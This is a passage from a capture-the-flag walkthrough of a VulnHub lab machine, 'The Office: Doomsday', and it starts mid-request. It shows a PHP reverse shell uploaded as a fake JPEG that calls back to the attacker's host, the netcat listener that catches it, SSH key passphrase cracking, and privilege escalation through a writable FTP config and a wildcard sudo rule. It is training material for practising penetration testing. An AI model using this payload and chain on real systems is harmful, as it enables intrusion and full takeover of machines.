WnqAdWA84kIwVIHNCiB95T70rwKdvTRlAzqwfNcGP%2BSL8Z%2BKYUFnfp9X4336dc9fccf0cac5ab6e5dc9717e8dea28f448b8
Connection: close

------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="name"

phprevshell2.php
------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="upload_session_start"

1667090521
------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="visibility"

public
------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="license"

all
------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="max_download"

none
------WebKitFormBoundaryw4GHiPqjZGRZcQlW
Content-Disposition: form-data; name="file"; filename="phprevshell2.php"
Content-Type: image/jpeg

<?php
$sock = fsockopen("192.168.56.1",4444);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

------WebKitFormBoundaryw4GHiPqjZGRZcQlW--
```

And now, when I click to download the "picture", I'm redirected to http://192.168.56.102:18888/storage/originals/94/a1/phprevshell2.php. If I listen on my machine at port 4444, I should get the reverse shell:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/server]
└─$ nc -s 192.168.56.1 -lnvp 4444                                    
listening on [192.168.56.1] 4444 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 56328
/bin/sh: 0: can't access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash");'   
www-data@doomsday:/var/www/koken/storage/originals/94/a1$ 
```

Now I must enumerate directories on this machine to see what I can get. I find out that there are three users: 'creed', 'dwight' and 'michael', but i cannot do much in thoso directories and since I'm www-data, I could check the html that is being served to see if there's any info that I'm missing. The /var/www directory has three directories in it: 'html', 'html2' and 'koken'. In 'html' I find:

```
www-data@doomsday:/var/www/html$ ls -la
ls -la
total 284
drwxr-xr-x 5 root root   4096 Nov 17  2020 .
drwxr-xr-x 5 root root   4096 Nov 12  2020 ..
drwxr-xr-x 2 root root   4096 Nov 30  2020 _hint_
-rw-r--r-- 1 root root 262100 Nov  2  2020 background.png
-rw-r--r-- 1 root root   2819 Nov 12  2020 index.html
drwxr-xr-x 2 root root   4096 Nov 30  2020 nick
-rw-r--r-- 1 root root     42 Nov 17  2020 robots.txt
drwxr-xr-x 2 root root   4096 Nov 30  2020 staffblog
```

A '\_hint\_' directory that can be accessed through browser. In it I find:

![the office 9](./images/the-office-9.png)

There is probably a hidden message in these files, so I download all three of them and compare them:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/server]
└─$ diff knockknock1.jpg  knockknock2.jpg 
Binary files knockknock1.jpg and knockknock2.jpg differ
                                                                                                                    
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/server]
└─$ diff knockknock1.jpg  knockknock3.jpg 
```

That means that the first and the third images are equal, the second image is the outlier, so I run exiftool on the second image:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/server]
└─$ exiftool knockknock2.jpg 
ExifTool Version Number         : 12.44
File Name                       : knockknock2.jpg
Directory                       : .
File Size                       : 93 kB
File Modification Date/Time     : 2022:10:29 21:55:59-03:00
File Access Date/Time           : 2022:10:29 21:56:39-03:00
File Inode Change Date/Time     : 2022:10:29 21:55:59-03:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Copyright                       : #FLAG6: c9db6b7cad326cab2bcf0d2a26f7832d
Comment                         : Open sesame: 5000, 7000, 9000
Image Width                     : 741
Image Height                    : 743
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 741x743
Megapixels                      : 0.551
```

There are two important informations hiding in this picture's metadata: the first one is the sixth flag: c9db6b7cad326cab2bcf0d2a26f7832d, which leaves us with four more to go, the second info is the "Open sesame" line right below the flag: I'll probably have to knock on the server with these values for the ssh port to open:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ knock 192.168.56.102 5000 7000 9000
                                                                                                                    
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ nmap -sC -sV -p 22 192.168.56.102                                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 22:19 -03
Nmap scan report for 192.168.56.102
Host is up (0.00046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:aa:c3:34:56:59:e5:0b:8f:b2:df:0a:2b:8c:ae:be (RSA)
|   256 4c:75:a5:4f:88:c5:80:b4:c2:ab:bf:92:f8:5d:f3:95 (ECDSA)
|_  256 a2:dc:93:86:18:93:e2:8f:f2:db:cc:b1:d8:2c:d7:8a (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds
zsh: segmentation fault  nmap -sC -sV -p 22 192.168.56.102
```

And voila: just like that it worked, now the next logical step, is cracking the ssh password, that probably belongs to user 'michael, so that I can log in with that key:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ john michael_hash --wordlist=/home/j/Desktop/wordlists/SecLists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypassword1234   (michael)     
1g 0:00:00:03 DONE (2022-10-29 22:28) 0.2824g/s 1486Kp/s 1486Kc/s 1486KC/s mypassword98765..mypass89
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now, with key and password 'mypassword1234', I can log into the machine:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday/scripts]
└─$ ssh -i michael michael@192.168.56.102
______                 _            ___  ____  __  __ _ _       
|  _  \               | |           |  \/  (_)/ _|/ _| (_)      
| | | |_   _ _ __   __| | ___ _ __  | .  . |_| |_| |_| |_ _ __  
| | | | | | | '_ \ / _` |/ _ \ '__| | |\/| | |  _|  _| | | '_ \ 
| |/ /| |_| | | | | (_| |  __/ |    | |  | | | | | | | | | | | |
|___/  \__,_|_| |_|\__,_|\___|_|    \_|  |_/_|_| |_| |_|_|_| |_|
Enter passphrase for key 'michael': 
michael@doomsday:~$ cd ..
-rbash: cd: restricted
michael@doomsday:~$ ls -la
total 60
drwxr-xr-x 6 michael michael  4096 Nov 30  2020 .
drwxr-xr-x 5 root    root     4096 Nov 16  2020 ..
-rw------- 1 michael michael  2687 Nov 30  2020 .bash_history
-rw-r--r-- 1 michael michael   220 Nov 12  2020 .bash_logout
-rw-r--r-- 1 michael michael  3771 Nov 12  2020 .bashrc
drwx------ 2 michael michael  4096 Nov 12  2020 .cache
drwx------ 3 michael michael  4096 Nov 12  2020 .gnupg
drwxrwxr-x 3 michael michael  4096 Nov 12  2020 .local
-rw-r--r-- 1 michael michael   807 Nov 12  2020 .profile
-rw-r----- 1 michael michael 13120 Nov 17  2020 script
drwx------ 2 michael michael  4096 Nov 13  2020 .ssh
-rw-r----- 1 michael michael    41 Nov 30  2020 .sus.txt
```

The hidden file .sus.txt has the seventh flag: 76a2ecd19b04acb89b7fe8c3d83296df, that leaves us with three more to go.

The 'cd' command is restricted, so I must deal with what's available, so I run 'sudo -l' to see if there is any command i can run as sudo:

```
michael@doomsday:~$ sudo -l
Matching Defaults entries for michael on doomsday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User michael may run the following commands on doomsday:
    (ALL) NOPASSWD: /home/creed/defuse*
```

I can run a file named 'defuse*' (the '*' character is a wildcard) but that file doesn't exist in creed's user, so I must upload a defuse file to it. I first create a simple 'defuse.sh' file that reads:

```shell
#!/bin/bash

/bin/bash
```

And upload it onto the machine, via the ftp server:

```
┌──(j㉿kali)-[~/Desktop/vulnhub/the-office-doomsday]
└─$ ftp -u ftp://creed:creed223@192.168.56.102/defuse.sh defuse.sh
Connected to 192.168.56.102.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
local: defuse.sh remote: defuse.sh
229 Entering Extended Passive Mode (|||40084|)
150 Ok to send data.
100% |***********************************************************************|    23      499.13 KiB/s    00:00 ETA
226 Transfer complete.
23 bytes sent in 00:00 (35.59 KiB/s)
```

And make it executable:

```
ftp> chmod +x defuse.sh
500 Unknown SITE command.
```

But I can't, so I must change the ftp config file through ssh user 'michael':

```
michael@doomsday:~$ ls -la /etc/vsftpd.conf
-rwxrwxrwx 1 root root 5924 Dec  3  2020 /etc/vsftpd.conf
```

I have the permissions, so I change the following:

```
chmod_enable=YES <-- before this was set as 'NO'
```

For the changes to take place, I must restart the service, which I don't have the authorization to do, so I manually restart the box. After the restart:

```
ftp> chmod 777 defuse.sh
200 SITE CHMOD command ok.
ftp> ls
229 Entering Extended Passive Mode (|||40064|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2026 Nov 12  2020 archive.zip
-rwxrwxrwx    1 1001     1001           23 Oct 30 02:24 defuse.sh
-rw-r--r--    1 0        0             176 Nov 30  2020 reminder.txt
226 Directory send OK.
```

So I knock on the machine again to open the ssh port, log in with the credentials previously acquired and then:

```
michael@doomsday:~$ sudo -u root /home/creed/defuse.sh
root@doomsday:~# 
```

The eighth flag is in /root/flag.txt and reads:

```
IDENTITY THEFT IS NOT A JOKE! Millions of families suffer every year.
But anyways. You beat me. You are the superior being.

Dwight Schrute
Assistant Regional Manager

#FLAG8: ebadbecff2429a90287e1ed98960e3f6

  _____                  _             __  __ _  __  __ _ _       
 |  __ \                | |           |  \/  (_)/ _|/ _| (_)      
 | |  | |_   _ _ __   __| | ___ _ __  | \  / |_| |_| |_| |_ _ __  
 | |  | | | | | '_ \ / _` |/ _ \ '__| | |\/| | |  _|  _| | | '_ \ 
 | |__| | |_| | | | | (_| |  __/ |    | |  | | | | | | | | | | | |
 |_____/ \__,_|_| |_|\__,_|\___|_|    |_|  |_|_|_| |_| |_|_|_| |_|
                                                            
```

Two flags missing, but the machine's been rooted.